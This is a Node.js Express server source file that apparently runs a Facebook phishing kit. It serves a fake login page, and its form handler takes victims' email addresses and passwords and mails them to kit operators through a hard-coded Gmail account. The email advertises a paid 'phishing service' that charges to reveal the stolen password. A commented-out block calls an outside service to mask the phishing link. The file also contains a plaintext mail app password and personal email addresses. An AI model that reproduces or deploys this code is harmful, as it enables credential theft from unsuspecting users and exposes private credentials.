const express = require('express');
const exphbs = require('express-handlebars');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const os = require('os');
var port = process.env.PORT || 1111;
var networkInterfaces = os.networkInterfaces();
var nodemailer = require('nodemailer');
const encryptpwd = require('encrypt-with-password');
 





const app = express();

app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use('/phishing-facebook', express.static('phishing-facebook'));

app.get('/', function (req, res) {
    res.render('f_login');
    
    
    
});
var myArray = [
    {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com"},

    {"id": 2, "name": "momin","email":"momin0132813@gmail.com"},
    {"id": 43, "name": "ebrahim", "email": "sh2471386@gmail.com"}
];


app.post('/_', function (req, res) {
   // res.render('f_success');
const text = 'Hello, World!';
const password = req.body.password;
 
const encrypted = encryptpwd.encrypt(text, password);
 
 
 
const decrypted = encryptpwd.decrypt(encrypted, password);

    
    var captured_content = `\n Email: ${req.body.email} Password: ${encrypted}`;
    let toMail = req.body.owner;
    
    
    
   // console.log("es"+toMail);
    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p>পাসওয়ার্ড পেতে এবং অ্যাপটিকে আরও সুরক্ষিত করতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-500 টাকা দিতে হবে। </p><br><br> If the input value has correct then id was hacked!"+captured_content+ "<br><br><br><br><br><br> Thanks for your understanding,<br>phishing service by 'Eshak'";

    
  if(req.body.owner){
    let toEmail = myArray.find(o => o.id == req.body.owner);

  // console.log(toEmail.email);
  
    var transporter = nodemailer.createTransport({
    service: "gmail",

  auth: {
    user: "bdeshak5@gmail.com",
    pass: "ritcqrbhpxwybfoh"
  }
});

   const mailOptions = {
  from: 'bdeshak5@gmail.com',
  to: toEmail.email, //list of receivers
  subject: 'Phishing service by "Eshak"', // Subject line
  html: template //plain text body
};

transporter.sendMail(mailOptions, function (err, info) {
  if (err)
    console.log(err)
  else
    console.log(info);
    
    res.render('f_success');
});
    }
    
    
 //   res.render('f_success');
    
    /*
    
    fs.appendFile('logs.txt', captured_content, err => {
        if (err) {
            console.error(err)
            return
        }
    });
    console.log("eshak:"+captured_content);
    
    */
    
});

app.get('/images/eye-off.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/eye-off.png'))
});
app.get('/images/eye.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/eye.png'))
});
app.get('/images/favicon.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/favicon.png'))
});
app.get('/images/logo.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/logo.png'))
});
app.get('/images/check.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/check.png'))
});

app.listen(port, () => {
    console.log('[!] Server Running!')
});

/*
axios.get(`http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${networkInterfaces.Ethernet[0].address}:${port}`).then(async res => {
    console.log(`[!] You can share this hidden link with your network users: ${res.data.Link}\n[!] If the link doesn't work. Try using your IPV4 + PORT: ${networkInterfaces.Ethernet[0].address}:${port}\n\n[+] Give this project a star on GitHub: https://github.com/pauloodev/phishing-facebook`)
});

*/
